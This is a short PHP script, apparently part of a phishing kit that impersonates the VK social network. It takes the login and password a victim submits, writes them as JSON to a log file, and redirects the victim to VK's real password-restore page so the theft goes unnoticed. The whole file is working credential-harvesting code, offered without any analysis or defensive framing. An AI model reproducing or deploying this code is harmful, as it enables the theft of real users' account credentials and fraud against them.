<?php

header('Location: https://vk.com/restore/');
$data = array('site' => 'Vk',
  'user' => $_POST['login'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
